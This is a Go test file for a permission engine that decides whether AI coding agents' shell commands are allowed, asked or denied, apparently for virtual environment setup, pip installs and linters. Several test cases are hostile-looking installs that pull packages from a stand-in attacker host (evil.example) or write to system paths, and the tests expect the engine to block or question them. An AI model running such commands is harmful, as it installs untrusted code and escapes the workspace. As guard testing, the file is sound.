package perm

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

// makeVenv lays out a virtual environment at dir as python -m venv makes one: pyvenv.cfg, bin with a pip whose first line runs the
// environment's python (a link to the system's), lib/pythonX.Y/site-packages and the lib64 link.
func makeVenv(t *testing.T, dir string) {
	t.Helper()
	for _, d := range []string{"bin", "include", "lib/python3.12/site-packages"} {
		if err := os.MkdirAll(filepath.Join(dir, d), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	files := map[string]string{
		"pyvenv.cfg": "home = /usr/bin\ninclude-system-site-packages = false\n",
		"bin/pip":    "#!" + filepath.Join(dir, "bin", "python3") + "\n# -*- coding: utf-8 -*-\nimport sys\n",
		"bin/pip3":   "#!" + filepath.Join(dir, "bin", "python3") + "\n# -*- coding: utf-8 -*-\nimport sys\n",
		"bin/pytest": "#!" + filepath.Join(dir, "bin", "python3") + "\n# -*- coding: utf-8 -*-\nimport sys\n",
	}
	for name, body := range files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	for link, target := range map[string]string{"bin/python3": "/usr/bin/python3", "bin/python": "python3", "lib64": "lib"} {
		if err := os.Symlink(target, filepath.Join(dir, link)); err != nil {
			t.Fatal(err)
		}
	}
}

// venvRig is a team rig whose worker be-1 has a virtual environment .venv in its tree, a requirement file, a constraint file and a
// project of its own (pyproject.toml), and a second environment outside the workspace.
func venvRig(t *testing.T, mode Mode, pr Prompter) *teamRig {
	t.Helper()
	r := newTeamRig(t, mode, pr)
	makeVenv(t, filepath.Join(r.wtA, ".venv"))
	makeVenv(t, filepath.Join(r.f.outside, "venv"))
	for name, body := range map[string]string{"requirements.txt": "pytest\n", "constraints.txt": "pytest<9\n", "pyproject.toml": "[project]\nname='x'\n",
		"src/app.py": "x = 1\n"} {
		p := filepath.Join(r.wtA, name)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return r
}

// The tests preset creates a virtual environment in the workspace and installs into it from the package index; nothing else about
// installs changes.
func TestTheTestsPresetAllowsAProjectVirtualEnvironment(t *testing.T) {
	r := venvRig(t, ModeAcceptEdits, nil)
	if err := os.Symlink(filepath.Join(r.f.outside, "venv"), filepath.Join(r.wtA, ".venv-link")); err != nil {
		t.Fatal(err)
	}
	escaping := filepath.Join(r.wtA, ".venv-site")
	makeVenv(t, escaping)
	site := filepath.Join(escaping, "lib/python3.12/site-packages")
	if err := os.RemoveAll(site); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(r.f.outside, site); err != nil {
		t.Fatal(err)
	}
	copied := filepath.Join(r.wtA, ".venv-copy") // a copy of an environment made elsewhere: its pip runs the original's python
	makeVenv(t, copied)
	for _, script := range []string{"bin/pip", "bin/pytest"} {
		if err := os.WriteFile(filepath.Join(copied, script), []byte("#!"+filepath.Join(r.f.outside, "venv/bin/python3")+"\n"), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	notVenv := filepath.Join(r.wtA, "fake")
	if err := os.MkdirAll(filepath.Join(notVenv, "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(notVenv, "bin/pip"), []byte("#!/usr/bin/python3\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct{ cmd, want, why string }{
		// creating one
		{cmd: "python3 -m venv .venv2", want: "allow"},
		{cmd: "python -m venv --without-pip venv", want: "allow"},
		{cmd: "python3 -m venv .venv", want: "allow"}, // already one
		{cmd: "virtualenv .venv3", want: "allow"},
		{cmd: "uv venv", want: "allow"},
		{cmd: "uv venv -q .venv4", want: "allow"},
		{cmd: `python3 -m venv "$TMPDIR/venv"`, want: "allow"},
		{cmd: "python3 -m venv .", want: "ask", why: "workspace root"},
		{cmd: "python3 -m venv " + r.wtA, want: "ask", why: "workspace root"},
		{cmd: "python3 -m venv --clear .venv", want: "ask", why: "--clear"},
		{cmd: "python3 -m venv src", want: "ask", why: "not a virtual environment"},
		{cmd: "python3 -m venv " + r.f.outside + "/v", want: "ask", why: "outside the workspace"},
		{cmd: "python3 -m venv ../venv", want: "deny", why: "isolation"}, // another place of the workspace than the worker's own tree
		{cmd: "python3 -m venv a b", want: "ask", why: "one environment"},
		{cmd: "uv venv --python 3.12", want: "ask", why: "--python"},
		// installing into one
		{cmd: ".venv/bin/pip install pytest", want: "allow"},
		{cmd: ".venv/bin/pip3 install -q -U 'pytest>=8,<9' 'requests[socks]==2.32.3' pip", want: "allow"},
		{cmd: ".venv/bin/pip install -r requirements.txt -c constraints.txt", want: "allow"},
		{cmd: ".venv/bin/pip install --requirement=requirements.txt --no-input --disable-pip-version-check --no-cache-dir --pre", want: "allow"},
		{cmd: ".venv/bin/pip install -e .", want: "allow"},
		{cmd: ".venv/bin/pip install -e '.[dev]'", want: "allow"},
		{cmd: ".venv/bin/python -m pip install pytest", want: "allow"},
		{cmd: ".venv/bin/python3 -m pip install -qU pytest", want: "allow"},
		{cmd: "uv pip install --python .venv/bin/python pytest", want: "allow"},
		{cmd: "uv pip install -p .venv/bin/python -r requirements.txt", want: "allow"},
		{cmd: "python3 -m venv .venv && .venv/bin/pip install pytest && .venv/bin/python -m pytest -q", want: "allow"},
		// running the tests with it
		{cmd: ".venv/bin/python -m pytest -q", want: "allow"},
		{cmd: ".venv/bin/pytest -q -k smoke", want: "allow"},
		{cmd: ".venv/bin/python3 -m unittest discover", want: "allow"},
		{cmd: ".venv/bin/python -m py_compile src/app.py", want: "allow"},
		{cmd: ".venv/bin/python -m py_compile " + r.f.outside + "/x.py", want: "ask", why: "outside the workspace"},
		{cmd: ".venv/bin/python -m http.server", want: "ask"},
		{cmd: ".venv/bin/python tools/gen.py", want: "ask", why: "runs the Python script tools/gen.py"},
		{cmd: ".venv/bin/python -c 'import os'", want: "ask", why: "given on the command line"},
		{cmd: ".venv-copy/bin/pytest -q", want: "ask", why: "own python"},
		{cmd: "fake/bin/pytest -q", want: "ask", why: "not a virtual environment"},
		{cmd: ".venv/bin/pip install --index-url https://evil.example/simple pytest", want: "ask", why: "where packages come from"},
		{cmd: ".venv/bin/pip install -i https://evil.example/simple pytest", want: "ask", why: "where packages come from"},
		{cmd: ".venv/bin/pip install --extra-index-url=https://evil.example/simple pytest", want: "ask", why: "where packages come from"},
		{cmd: ".venv/bin/pip install -f https://evil.example/links pytest", want: "ask", why: "where packages come from"},
		{cmd: ".venv/bin/pip install --trusted-host evil.example pytest", want: "ask", why: "where packages come from"},
		{cmd: ".venv/bin/pip install --user pytest", want: "ask", why: "where packages are installed"},
		{cmd: ".venv/bin/pip install --target " + r.f.outside + " pytest", want: "ask", why: "where packages are installed"},
		{cmd: ".venv/bin/pip install --prefix=" + r.f.outside + " pytest", want: "ask", why: "where packages are installed"},
		{cmd: ".venv/bin/pip install --prefix=/usr/local pytest", want: "deny"},
		{cmd: ".venv/bin/pip install --root / pytest", want: "deny"},
		{cmd: ".venv/bin/pip install --break-system-packages pytest", want: "ask", why: "where packages are installed"},
		{cmd: ".venv/bin/pip install --config-settings x=y pytest", want: "ask", why: "not an option"},
		{cmd: ".venv/bin/pip install git+https://github.com/x/y", want: "ask", why: "URL or a repository"},
		{cmd: ".venv/bin/pip install https://evil.example/x-1.0-py3-none-any.whl", want: "ask", why: "URL or a repository"},
		{cmd: ".venv/bin/pip install 'x @ https://evil.example/x.whl'", want: "ask", why: "URL or a repository"},
		{cmd: ".venv/bin/pip install file://" + r.f.outside + "/x", want: "ask", why: "URL or a repository"},
		{cmd: ".venv/bin/pip install -r " + r.f.outside + "/req.txt", want: "ask", why: "outside the workspace"},
		{cmd: ".venv/bin/pip install -r ../../../../outside/req.txt", want: "ask", why: "outside the workspace"},
		{cmd: ".venv/bin/pip install -e " + r.f.outside, want: "ask", why: "outside the workspace"},
		{cmd: ".venv/bin/pip install " + r.f.outside + "/x.whl", want: "ask", why: "outside the workspace"},
		{cmd: `.venv/bin/pip install -r "$REQS"`, want: "ask"},
		{cmd: ".venv/bin/pip install", want: "ask", why: "nothing to install"},
		{cmd: ".venv/bin/pip download pytest", want: "ask"},
		{cmd: ".venv-link/bin/pip install pytest", want: "ask", why: "outside the workspace"},
		{cmd: r.f.outside + "/venv/bin/pip install pytest", want: "ask", why: "outside the workspace"},
		{cmd: "../../../../outside/venv/bin/pip install pytest", want: "ask", why: "outside the workspace"},
		{cmd: ".venv-site/bin/pip install pytest", want: "ask", why: "leads outside the environment"},
		{cmd: ".venv-copy/bin/pip install pytest", want: "ask", why: "own python"},
		{cmd: "fake/bin/pip install pytest", want: "ask", why: "not a virtual environment"},
		{cmd: "src/pip install pytest", want: "ask", why: "bin directory"},
		{cmd: "uv pip install pytest", want: "ask", why: "--python"},
		{cmd: "uv pip install --system pytest", want: "ask"},
		{cmd: "uv pip install --python .venv/bin/python --index-url https://evil.example/simple pytest", want: "ask", why: "where packages come from"},
		{cmd: "VIRTUAL_ENV=.venv uv pip install pytest", want: "ask"},
		{cmd: "PIP_INDEX_URL=https://evil.example .venv/bin/pip install pytest", want: "ask", why: "PIP_INDEX_URL"},
		// every other install keeps asking
		{cmd: "pip install pytest", want: "ask", why: "installs, removes or downloads packages"},
		{cmd: "pip3 install --user pytest", want: "ask"},
		{cmd: "python3 -m pip install pytest", want: "ask"},
		{cmd: "/usr/bin/pip3 install pytest", want: "ask"},
		{cmd: "sudo .venv/bin/pip install pytest", want: "ask", why: "high risk"},
		{cmd: "npm install left-pad", want: "ask"},
		{cmd: "go install example.com/x@latest", want: "ask"},
		{cmd: "cargo install ripgrep", want: "ask"},
	} {
		d := r.check("be-1", r.wtA, c.cmd)
		if got := outcome(d); got != c.want {
			t.Errorf("%q: %s (%q), want %s", c.cmd, got, d.Reason, c.want)
		}
		if c.why != "" && !strings.Contains(d.Reason, c.why) {
			t.Errorf("%q: reason %q does not say %q", c.cmd, d.Reason, c.why)
		}
	}
}

// In default mode a virtual environment's creation and install are questions the manager may answer (routine), and the install's
// question says that it reaches the package index; an install the preset does not allow, and every other install, goes to the person.
func TestAProjectVirtualEnvironmentIsRoutine(t *testing.T) {
	var mu sync.Mutex
	delegated := map[string]Request{}
	r := venvRig(t, ModeDefault, func(context.Context, Request) Decision { return Decision{Allow: true} })
	r.e.cfg.Delegate = func(_ context.Context, q Request) (Decision, string) {
		mu.Lock()
		delegated[q.Command] = q
		mu.Unlock()
		return Decision{Allow: true}, "manager"
	}
	routine := map[string]bool{ // command -> it reaches the package index
		"python3 -m venv .venv2": false, "uv venv": false, ".venv/bin/pip install pytest": true,
		".venv/bin/python -m pip install -r requirements.txt": true, "uv pip install --python .venv/bin/python pytest": true,
		".venv/bin/pip install -e '.[dev]' && .venv/bin/python -m pytest -q": true,
	}
	personal := []string{
		".venv/bin/pip install --index-url https://evil.example/simple pytest", "/usr/bin/pip install pytest", "pip install pytest",
		".venv/bin/pip install --user pytest", ".venv/bin/pip install git+https://github.com/x/y", "../../../../outside/venv/bin/pip install x",
		"python3 -m venv --clear .", "uv pip install pytest", "./node_modules/.bin/npm install left-pad",
		".venv/bin/pip install -r " + r.f.outside + "/req.txt",
	}
	for cmd := range routine {
		r.check("be-1", r.wtA, cmd)
	}
	for _, cmd := range personal {
		r.check("be-1", r.wtA, cmd)
	}
	for cmd, index := range routine {
		q, ok := delegated[cmd]
		if !ok {
			t.Errorf("%q was not put to the manager", cmd)
			continue
		}
		if q.PackageIndex != index {
			t.Errorf("%q: PackageIndex %v, want %v", cmd, q.PackageIndex, index)
		}
	}
	for _, cmd := range personal {
		if _, ok := delegated[cmd]; ok {
			t.Errorf("%q was put to the manager", cmd)
		}
	}
}

// A rule about virtual environments can deny or ask as well: Bash(python:venv) in deny refuses every command that creates or installs
// into one, whether or not the preset would allow it.
func TestAVenvRuleRestricts(t *testing.T) {
	r := venvRig(t, ModeAcceptEdits, nil)
	e := r.f.engine(t, Config{Mode: ModeAcceptEdits, Tmp: r.tmp, TreeParents: []string{r.trees}, Deny: []string{"Bash(python:venv)"}})
	for _, cmd := range []string{".venv/bin/pip install pytest", "python3 -m venv .venv2", ".venv/bin/pip install --user x"} {
		d := e.Check(bg, Request{Agent: "be-1", Tool: "Bash", Command: cmd, Cwd: r.wtA})
		if outcome(d) != "deny" || !strings.Contains(d.Reason, "Bash(python:venv)") {
			t.Errorf("%q: %+v", cmd, d)
		}
	}
	if d := e.Check(bg, Request{Agent: "be-1", Tool: "Bash", Command: "python3 -m pytest", Cwd: r.wtA}); !d.Allow {
		t.Errorf("python3 -m pytest: %+v", d)
	}
	if _, err := ParseRule(Allow, "Bash(pip:venv)"); err == nil {
		t.Error("a venv rule for pip was accepted")
	}
}

// The checkers of the tests preset are allowed while every file they name is inside the workspace, and without the options that make
// them write elsewhere or install.
func TestTheTestsPresetChecksInsideTheWorkspace(t *testing.T) {
	r := venvRig(t, ModeAcceptEdits, nil)
	for _, c := range []struct{ cmd, want, why string }{
		{cmd: "python3 -m py_compile src/app.py", want: "allow"},
		{cmd: "python -m compileall -q src", want: "allow"},
		{cmd: "python3 -m py_compile " + r.f.outside + "/x.py", want: "ask", why: "outside the workspace"},
		{cmd: "ruff check .", want: "allow"},
		{cmd: "ruff check --select E501 src", want: "allow"},
		{cmd: "ruff check --fix .", want: "ask"},
		{cmd: "ruff check --fix src", want: "ask", why: "--fix"},
		{cmd: "ruff format --check .", want: "allow"},
		{cmd: "ruff format .", want: "ask"}, // a formatter: the preset has its check only
		{cmd: "mypy src", want: "allow"},
		{cmd: "mypy --install-types --non-interactive src", want: "ask", why: "--install-types"},
		{cmd: "mypy --cache-dir " + r.f.outside + " src", want: "ask", why: "outside the workspace"},
		{cmd: "pyright", want: "allow"},
		{cmd: "pyright --createstub requests", want: "ask", why: "--createstub"},
		{cmd: "tsc --noEmit -p .", want: "allow"},
		{cmd: "tsc -p .", want: "ask"},
		{cmd: "tsc --noEmit --generateTrace trace", want: "ask", why: "--generateTrace"},
		{cmd: "eslint src", want: "allow"},
		{cmd: "eslint --fix src", want: "ask", why: "--fix"},
		{cmd: "eslint -o " + r.f.outside + "/report.json src", want: "ask", why: "outside the workspace"},
	} {
		d := r.check("be-1", r.wtA, c.cmd)
		if got := outcome(d); got != c.want {
			t.Errorf("%q: %s (%q), want %s", c.cmd, got, d.Reason, c.want)
		}
		if c.why != "" && !strings.Contains(d.Reason, c.why) {
			t.Errorf("%q: reason %q does not say %q", c.cmd, d.Reason, c.why)
		}
	}
	// default mode with the preset allowed by a flag: the same, and the same refusals
	e := r.f.engine(t, Config{Mode: ModeDefault, Tmp: r.tmp, TreeParents: []string{r.trees}, Allow: TestsAllow})
	for cmd, want := range map[string]string{"mypy src": "allow", "ruff check --fix .": "ask", ".venv/bin/pip install pytest": "allow",
		".venv/bin/pip install --user pytest": "ask"} {
		if d := e.Check(bg, Request{Agent: "be-1", Tool: "Bash", Command: cmd, Cwd: r.wtA}); outcome(d) != want {
			t.Errorf("--allow tests: %q: %+v, want %s", cmd, d, want)
		}
	}
}
